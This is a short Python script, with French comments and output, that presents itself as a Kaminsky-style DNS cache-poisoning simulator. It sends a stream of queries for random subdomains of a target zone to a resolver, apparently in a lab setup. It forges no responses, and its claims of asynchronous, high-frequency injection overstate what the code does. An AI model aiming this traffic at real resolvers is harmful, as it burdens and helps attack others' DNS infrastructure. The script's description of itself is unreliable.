#!/usr/bin/env python3
"""
Simulateur de tentative de Cache Poisoning (Style Kaminsky).
Envoi asynchrone haute fréquence de requêtes pour des sous-domaines aléatoires
forçant le résolveur à initier des courses de récursion externes.
"""
import sys
import time
import random
import string
import argparse
import socket
from datetime import datetime

def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def build_dns_query(qname):
    tid = random.randint(1, 65535)
    header = tid.to_bytes(2, 'big') + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    q = b''
    for part in qname.split('.'):
        q += len(part).to_bytes(1, 'big') + part.encode()
    q += b'\x00\x00\x01\x00\x01' # Type A, Class IN
    return header + q

def run_poisoning_simulation(target_dns: str, victim_domain: str, attempts: int):
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"================================================================")
    print(f"[*] Attaque démarrée à : {now_str}")
    print(f"[*] Type : Cache Poisoning (Tentative de course de vitesse Kaminsky)")
    print(f"[*] Cible Résolveur : {target_dns}")
    print(f"[*] Zone visée : {victim_domain}")
    print(f"[*] Rafales d'injection prévues : {attempts} requêtes")
    print(f"================================================================\n")

    start_time = time.time()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for i in range(1, attempts + 1):
        rand_prefix = random_string(10)
        fake_sub = f"{rand_prefix}.{victim_domain}"
        pkt = build_dns_query(fake_sub)
        try:
            s.sendto(pkt, (target_dns, 53))
        except Exception:
            pass

        cur_ts = datetime.now().strftime("%H:%M:%S")
        print(f"  [{cur_ts}] > Requête récursive #{i}/{attempts} : {fake_sub}")
        time.sleep(0.04) # 25 requêtes par seconde

    s.close()
    duration = time.time() - start_time
    rate = attempts / duration if duration > 0 else 0
    end_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[+] Séquence d'attaque terminée à : {end_str}")
    print(f"[+] Total émis : {attempts} requêtes en {duration:.2f}s (~{rate:.1f} req/s).")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulateur Cache Poisoning")
    parser.add_argument("--dns", default="172.28.0.2", help="IP du résolveur")
    parser.add_argument("--domain", default="banque.bj", help="Zone cible")
    parser.add_argument("--attempts", type=int, default=40, help="Nombre d'itérations")
    args = parser.parse_args()

    run_poisoning_simulation(args.dns, args.domain, args.attempts)
